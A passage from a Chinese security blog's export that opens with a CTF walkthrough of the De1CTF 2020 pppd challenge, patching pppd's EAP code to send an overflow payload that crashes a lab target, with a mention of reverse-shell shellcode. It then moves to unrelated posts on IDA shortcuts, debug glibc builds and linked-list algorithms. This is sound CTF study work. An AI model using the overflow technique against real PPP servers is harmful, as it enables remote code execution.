<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Put a getty on the serial port</span><br><span class="line">#ttyS0::respawn:&#x2F;sbin&#x2F;getty -L  ttyS0 0 vt100 # GENERIC_SERIAL</span><br><span class="line">#ttyS0::sysinit:&#x2F;pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"># Bring up network device</span><br><span class="line">::sysinit:&#x2F;sbin&#x2F;ifup -a</span><br><span class="line"># Launch gdbserver</span><br><span class="line">ttyS0::sysinit:&#x2F;gdbserver :1234 &#x2F;pppd &#x2F;dev&#x2F;ttyS1 auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"></span><br><span class="line"># Stuff to do for the 3-finger salute</span><br></pre></td></tr></table></figure>
<p>（3）修改<code>start.sh</code>文件</p>
<p>将最后面<code>-net null...</code>选项修改为<code>-net user,hostfwd=tcp::1234-:1234 -net nic -serial stdio -serial pty</code></p>
<p>（4）将gdbserver放到环境的根目录<code>rootfs/</code>下</p>
<p>（5）重新打包<code>rootfs.img</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ find . | cpio -H newc -o &gt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
<p>（6）运行</p>
<p><code>./start.sh</code></p>
<p><img src="/2020/10/22/01-08/image-20200830122145171.png" alt="image-20200830122145171"></p>
<p>打开一个新的窗口，使用<code>gdb</code>启动并连接远程<code>pppd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;hws_zongjie&#x2F;pppd&#x2F;attachment&#x2F;docker&#x2F;chall$ gdb-multiarch -ex &#39;set architecture mips&#39;   \</span><br><span class="line">               -ex &#39;target remote :1234&#39;     \</span><br><span class="line">               -ex &#39;file rootfs&#x2F;pppd&#39;        \</span><br><span class="line">               -ex &#39;break *0x42F9A8&#39;         \</span><br><span class="line">               -ex &#39;continue&#39;</span><br></pre></td></tr></table></figure>
<p>再打开一个新的窗口</p>
<p>编写一个1024字节长的循环字符串<code>/tmp/sc</code>作为payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python -c &#39;from pwn import*; open(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;wb&quot;).write(cyclic(1024))&#39;</span><br><span class="line">$ cat &#x2F;tmp&#x2F;sc</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak</span><br></pre></td></tr></table></figure>
<p>接着</p>
<p>（1）下载ppp的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;paulusmack&#x2F;ppp.git</span><br><span class="line">cd ppp</span><br><span class="line">cd pppd</span><br></pre></td></tr></table></figure>
<p>（2）修改<code>eap.c</code>，搜索<code>eap_chap_response</code>，找到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">		    esp-&gt;es_client.ea_namelen);</span><br></pre></td></tr></table></figure>
<p>修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char payload[1024] &#x3D; &#123;0&#125;;</span><br><span class="line">FILE *fp &#x3D; fopen(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;r&quot;);</span><br><span class="line">fread(payload, 1, 1024, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">eap_chap_response(esp, id, hash, payload, 1024);</span><br></pre></td></tr></table></figure>
<p>（3）编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ..</span><br><span class="line">pppd$ make </span><br><span class="line">$ cd pppd</span><br><span class="line">$ cp pppd pppd-payload</span><br></pre></td></tr></table></figure>
<p>（4）在本地机器运行patched <code>pppd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo .&#x2F;pppd-payload noauth local defaultroute debug nodetach &#x2F;dev&#x2F;pts&#x2F;1 user admin password 1234568</span><br></pre></td></tr></table></figure>
<p>不久，远程<code>pppd</code>崩溃并出现分段错误。</p>
<p><img src="/2020/10/22/01-08/image-20200830154226602.png" alt="image-20200830154226602"></p>
<p>获取flag：</p>
<p>方法一：</p>
<p>执行<code>./exp.sh</code>，wireshark单独捕捉流量，然后直接搜flag</p>
<p>方法二：</p>
<p>msf生成 shellcode，然后用gen_payload.py脚本去生成payload就行了</p>
<p>不过由于这是本地模拟，方法一可能抓不到，方法二反弹shellcode好像也有点问题，但是会回连端口。</p>
<p>参考：</p>
<p><a href="https://www.anquanke.com/post/id/200639" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200639</a></p>
<p><a href="https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd" target="_blank" rel="noopener">https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd</a></p>
<p><a href="https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md</a></p>
<h5 id="（b）2019-0ctf-embeded-heap"><a href="#（b）2019-0ctf-embeded-heap" class="headerlink" title="（b）2019 0ctf - embeded_heap"></a>（b）2019 0ctf - embeded_heap</h5><p>参考：</p>
<p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
<p>考点：</p>
<ol>
<li>mips 堆溢出利用；</li>
<li>uClibc 堆管理机制。 </li>
</ol>
<h4 id="2）ctf-中的-arm-pwn"><a href="#2）ctf-中的-arm-pwn" class="headerlink" title="2）ctf 中的 arm pwn"></a>2）ctf 中的 arm pwn</h4><h3 id="四、固件中常见安全漏洞"><a href="#四、固件中常见安全漏洞" class="headerlink" title="四、固件中常见安全漏洞"></a>四、固件中常见安全漏洞</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>栈溢出是在IOT设备固件中非常常见的一类的漏洞，当溢出的长度足以控制栈上的返回地址时，很容易造成任意代码执行的风险。</p>
<p><img src="/2020/10/22/01-08/image-20200830015127901.png" alt="image-20200830015127901"></p>
<p>DLINK DIR-815 路由器前台栈溢出</p>
<h4 id="命令执行-命令注入"><a href="#命令执行-命令注入" class="headerlink" title="命令执行 / 命令注入"></a>命令执行 / 命令注入</h4><p>命令注入在IOT设备固件同样非常普遍，且利用简单，注入点通常运行的服务都是root权限。</p>
<ul>
<li>DLINK DIR-859 upnp 协议命令注入</li>
<li>tplink sr20 路由器命令注入</li>
<li>Draytek Vigor2960 前台登录处栈溢出</li>
</ul>
<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><p>在 IOT 设备固件中，拒绝服务漏洞通常是由于程序自身代码逻辑的缺陷导致的一类漏洞，这类漏洞一般都是由于内存操作方面的操作不当，造成空指针异常或者非法地址引用等问题进而导致设备服务崩溃或者设备重启。</p>
<h3 id="五、实战"><a href="#五、实战" class="headerlink" title="五、实战"></a>五、实战</h3><p>栈溢出</p>
<p>TPLINK WR841n 路由器后台栈溢出</p>
<p>漏洞成因：httpd 服务中 stringModify 函数没有对转移义后的字符串长度进行有效判断，导致最后的字符串复制到目标栈内存空间中，其长度超过当前栈空间的大小，发生栈溢出。</p>
<p>命令注入</p>
<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
<p>漏洞成因：tddp 协议服务对用户的输入没有进行有效的过滤，导致用户可以构造恶意的数据包造成命令注入。</p>
<hr>
<h3 id="cpio的解包与打包："><a href="#cpio的解包与打包：" class="headerlink" title="cpio的解包与打包："></a>cpio的解包与打包：</h3><p>cpio -idvm &lt; <strong>../rootfs.img</strong><br>find . | cpio -H newc -o &gt; <strong>../initrd.cpio</strong></p>
<h3 id="squashfs解包与打包："><a href="#squashfs解包与打包：" class="headerlink" title="squashfs解包与打包："></a>squashfs解包与打包：</h3><p>unsquashfs  openwrt.squashfs<br>mksquashfs squashfs-root-0 1.squashfs -comp xz</p>
<h3 id="ext4"><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h3><p>这种文件系统的打包与解包使用mount挂载</p>
<p><img src="/2020/10/22/01-08/image-20200829204006754.png" alt="image-20200829204006754"></p>
<p>可以把cpio,squashfs,ext4理解成一个压缩包，都可以用<strong>binwalk解包</strong>，但是打包的方式是不同的</p>
<p>这些东西其实就是文件系统，不仅仅保存文件内容，还保存这文件的元数据（名字，修改时间，作者啥啥的）</p>
]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>常用快捷键</title>
    <url>/2021/03/11/22-01/</url>
    <content><![CDATA[<h2 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h2><p>繁体变简体：<code>ctrl + shift + f</code></p>
<h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><ul>
<li>定位地址：g</li>
<li>重命名：n</li>
<li>数据类型切换：d（db    =&gt;    dw    =&gt;    dd）</li>
<li>字符转换：R</li>
</ul>
<h3 id="创建结构体"><a href="#创建结构体" class="headerlink" title="创建结构体"></a>创建结构体</h3><ul>
<li>跳转到结构体界面：shift + f9</li>
<li>创建结构体：insert + （fn）</li>
<li>创建数据/修改数据所占字节：d</li>
<li>指定数据类型：y =&gt; int、short、int*</li>
<li>将某个数据设置为结构体数据：y =&gt; 结构体名字</li>
</ul>
<h2 id="clion"><a href="#clion" class="headerlink" title="clion"></a>clion</h2><p>自动对齐：ctrl+alt+l</p>
]]></content>
  </entry>
  <entry>
    <title>用随机梯度下降来优化人</title>
    <url>/2021/10/30/19-40/</url>
    <content><![CDATA[<blockquote>
<p>由于文章不让转载和分享，但是真的非常喜欢，就贴上文章链接和截图。</p>
</blockquote>
<p>链接：<a href="https://www.bilibili.com/read/cv13335461?spm_id_from=333.999.0.0" target="_blank" rel="noopener">https://www.bilibili.com/read/cv13335461?spm_id_from=333.999.0.0</a></p>
<p><img src="/2021/10/30/19-40/用随机梯度下降来优化人生.png" alt="用随机梯度下降来优化人生"></p>
]]></content>
      <categories>
        <category>分享</category>
      </categories>
      <tags>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>编译debug版本的glibc</title>
    <url>/2021/02/18/09-35/</url>
    <content><![CDATA[<h2 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h2><ol>
<li>通常系统中的共享库均为release版本，去除了符号表等调试信息，为了调试方便，需要准备一份debug版本的glibc</li>
<li>CTF比赛中二进制程序所需的libc版本与本地系统的版本不同，为了程序在本地正常运行，需要配置合适的libc</li>
</ol>
<h2 id="下载glibc源码"><a href="#下载glibc源码" class="headerlink" title="下载glibc源码"></a>下载glibc源码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git:&#x2F;&#x2F;sourceware.org&#x2F;git&#x2F;glibc.git </span><br><span class="line">cd glibc</span><br><span class="line">git checkout glibc-2.27</span><br></pre></td></tr></table></figure>
<h2 id="编译glibc源码"><a href="#编译glibc源码" class="headerlink" title="编译glibc源码"></a>编译glibc源码</h2><h3 id="编译64位"><a href="#编译64位" class="headerlink" title="编译64位"></a>编译64位</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">..&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;glibc-2.27 --enable-debug&#x3D;yes</span><br><span class="line">make -j4</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<h3 id="编译32位"><a href="#编译32位" class="headerlink" title="编译32位"></a>编译32位</h3><h4 id="安装i686所需包"><a href="#安装i686所需包" class="headerlink" title="安装i686所需包"></a>安装i686所需包</h4><blockquote>
<p><a href="https://0xffff.one/d/337" target="_blank" rel="noopener">参考</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install binutils-i686-gnu </span><br><span class="line">sudo apt install gcc-i686-linux-gnu </span><br><span class="line">sudo apt install binutils-i686-gnu-dbg </span><br><span class="line">sudo apt install g++-i686-linux-gnu</span><br><span class="line">#sudo apt install g++</span><br><span class="line">#sudo apt install gcc</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果报错，换一个源即可</p>
<p><a href="https://www.jianshu.com/p/a15c2d3b54dd" target="_blank" rel="noopener">参考</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;apt</span><br><span class="line">subl sources.list</span><br><span class="line">#将如下内容拷贝进去</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># deb cdrom:[Debian GNU&#x2F;Linux 7.0 _Kali_ - Official Snapshot i386 LIVE&#x2F;INSTALL $</span><br><span class="line"></span><br><span class="line"># deb cdrom:[Debian GNU&#x2F;Linux 7.0 _Kali_ - Official Snapshot i386 LIVE&#x2F;INSTALL $</span><br><span class="line"></span><br><span class="line">## Security updates</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F; &#x2F;kali main contrib non-free</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F; &#x2F;wheezy main contrib non-free</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-dev main contrib non-free</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-dev main&#x2F;debian-installer</span><br><span class="line"></span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-dev main contrib non-free</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali main contrib non-free</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali main&#x2F;debian-installer</span><br><span class="line"></span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali main contrib non-free</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;security.kali.org&#x2F;kali-security kali&#x2F;updates main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src http:&#x2F;&#x2F;security.kali.org&#x2F;kali-security kali&#x2F;updates main contrib non-fr$</span><br></pre></td></tr></table></figure>
<h3 id="下载32位"><a href="#下载32位" class="headerlink" title="下载32位"></a>下载32位</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #..&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;glibc-2.23_32 --enable-debug&#x3D;yes --host&#x3D;i686-linux-gnu --build&#x3D;i686-linux-gnu CC&#x3D;&quot;gcc -m32&quot; CXX&#x3D;&quot;g++ m32&quot; CFLAGS&#x3D;&quot;-O2 -march&#x3D;i686&quot; CXXFLAGS&#x3D;&quot;-O2 -march&#x3D;i686&quot;</span><br><span class="line">#上为原书所写，但使用报错，后发现下面改方法好用 </span><br><span class="line">CC&#x3D;&quot;gcc -m32&quot; CXX&#x3D;&quot;g++ -m32&quot; \             </span><br><span class="line">        CFLAGS&#x3D;&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -fno-stack-protector&quot; \</span><br><span class="line">        CXXFLAGS&#x3D;&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -fno-stack-protector&quot; \</span><br><span class="line">        ..&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;glibc-2.23_32 --host&#x3D;i686-linux-gnu --disable-werror</span><br></pre></td></tr></table></figure>
<h4 id="编译-amp-链接"><a href="#编译-amp-链接" class="headerlink" title="编译 &amp; 链接"></a>编译 &amp; 链接</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<h2 id="使用该libc运行其他已编译的程序"><a href="#使用该libc运行其他已编译的程序" class="headerlink" title="使用该libc运行其他已编译的程序"></a>使用该libc运行其他已编译的程序</h2><h3 id="替换二进制文件的编译器路径"><a href="#替换二进制文件的编译器路径" class="headerlink" title="替换二进制文件的编译器路径"></a>替换二进制文件的编译器路径</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#change_ld.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary, ld,output)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> binary <span class="keyword">or</span> <span class="keyword">not</span> ld <span class="keyword">or</span> <span class="keyword">not</span> output:</span><br><span class="line">	log.failure(<span class="string">"Try 'python change_ld.py -h for more information.'"</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">	</span><br><span class="line">    binary = ELF(binary)</span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            binary.write(addr,<span class="string">"/lib64/ld-glibc-&#123;&#125;"</span>.format(ld).ljust(size,<span class="string">'\0'</span>))</span><br><span class="line">         </span><br><span class="line">            <span class="keyword">if</span> os.access(output, os.F_OK): </span><br><span class="line">                os.remove(output)</span><br><span class="line">            binary.save(output)    </span><br><span class="line">            os.chmod(output, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, output)) </span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'Force to use assigned new ld.so by changing the binary'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-b'</span>,dest=<span class="string">"binary"</span>,help=<span class="string">'input binary'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-l'</span>,dest=<span class="string">"ld"</span>,help=<span class="string">'ld.so version'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-o'</span>,dest=<span class="string">"output"</span>,help=<span class="string">'outputfile'</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">change_ld(args.binary,args.ld,args.output)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ln -s &#x2F;usr&#x2F;local&#x2F;glibc-2.27&#x2F;lib&#x2F;ld-2.27.so &#x2F;lib64&#x2F;ld-glibc-2.27</span><br><span class="line">python change_ld.py -b 二进制文件 -l 2.27 -o 输出文件名</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;tw$ file tcache_tear </span><br><span class="line">tcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;a273b72984b37439fd6e9a64e86d1c2131948f32, stripped</span><br><span class="line"></span><br><span class="line">#成功</span><br><span class="line">winter@ubuntu:~&#x2F;tw$ file tcache_debug </span><br><span class="line">tcache_debug: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-glibc-2.27, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;a273b72984b37439fd6e9a64e86d1c2131948f32, stripped</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process([<span class="string">"/home/winter/ff/ld-2.32.so"</span>, <span class="string">"./ff"</span>],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/ff/libc.so.6"</span>&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>主要参考《CTF竞赛权威指南（pwn篇）》5.1.3中内容</p>
<p>在做2.27的pwn题，tcache的机制总是失败，double free，，，这样修改后就可以用了。</p>
<h2 id="glibc下载"><a href="#glibc下载" class="headerlink" title="glibc下载"></a>glibc下载</h2><p><a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>牛客网-算法篇</title>
    <url>/2021/04/18/08-14/</url>
    <content><![CDATA[<h2 id="NC4判断链表中是否有环"><a href="#NC4判断链表中是否有环" class="headerlink" title="NC4判断链表中是否有环"></a>NC4判断链表中是否有环</h2><blockquote>
<p>这道题学到了很多，尤其是快慢指针的问题，第一次见到，有三种方法，，，，</p>
</blockquote>
<h3 id="解法1-快慢指针"><a href="#解法1-快慢指针" class="headerlink" title="解法1:快慢指针"></a>解法1:快慢指针</h3><blockquote>
<p>貌似是个经典问题，使用快慢指针也是最简单的一种方法。</p>
<p>他的方法就是两个指针同时出发，慢指针一次走一步，快指针一次走两步，如果相遇的话就说明有环，否则说明没有环。</p>
</blockquote>
<h4 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span>)&#123;<span class="comment">//直接返回的情况</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* slow = head;<span class="comment">//慢指针</span></span><br><span class="line">        ListNode* fast = head;<span class="comment">//快指针</span></span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">nullptr</span> &amp;&amp; fast-&gt;next != <span class="literal">nullptr</span>)&#123;<span class="comment">//还可以继续走</span></span><br><span class="line">            slow = slow-&gt;next;<span class="comment">//慢指针走一步</span></span><br><span class="line">            fast = fast-&gt;next-&gt;next;<span class="comment">//快指针走两步</span></span><br><span class="line">            <span class="keyword">if</span>(slow == fast)&#123;<span class="comment">//如果相遇了</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="解法2-存放到集合"><a href="#解法2-存放到集合" class="headerlink" title="解法2:存放到集合"></a>解法2:存放到集合</h3><h4 id="集合set"><a href="#集合set" class="headerlink" title="集合set"></a>集合set</h4><blockquote>
<p>这个方法比较简单，，，就是每次判断集合中是否有了元素，如果有了的话，就有环，如果没有的话，就加入到集合，，，继续判断。。。</p>
</blockquote>
<h5 id="1-是否包含某个元素"><a href="#1-是否包含某个元素" class="headerlink" title="1.是否包含某个元素"></a>1.是否包含某个元素</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span>.count(<span class="string">"元素"</span>);</span><br></pre></td></tr></table></figure>
<h5 id="2-添加元素"><a href="#2-添加元素" class="headerlink" title="2.添加元素"></a>2.添加元素</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span>.insert(<span class="string">"元素"</span>)</span><br></pre></td></tr></table></figure>
<h4 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">set</span>&lt;ListNode*&gt; <span class="built_in">set</span>;</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">set</span>.count(head))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">set</span>.insert(head);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="解法3-逐个删除"><a href="#解法3-逐个删除" class="headerlink" title="解法3:逐个删除"></a>解法3:逐个删除</h3><blockquote>
<p>这个方法也很有意思，，，，<del>其实和set本质上有些类似，，，我感觉</del></p>
<p>他的方法是一个链表从头开始删除，删除的方法也很有意思，就是让他的next指针指向自己，，，，如果没有换的话，每次删除没有问题，，，如果有环的话，，，会发现想要删除的时候，发现next指针已经指向自己了。。。</p>
</blockquote>
<p>图示：</p>
<p><img src="/2021/04/18/08-14/F616B722C8FF288FE7C88E6AF6A22025" alt="图片说明"></p>
<p>在第三的的next想要删除的时候，会发现1的next已经指向自己了，，，就判断出有环，，，</p>
<h4 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span> || head-&gt;next == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;next == head)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span 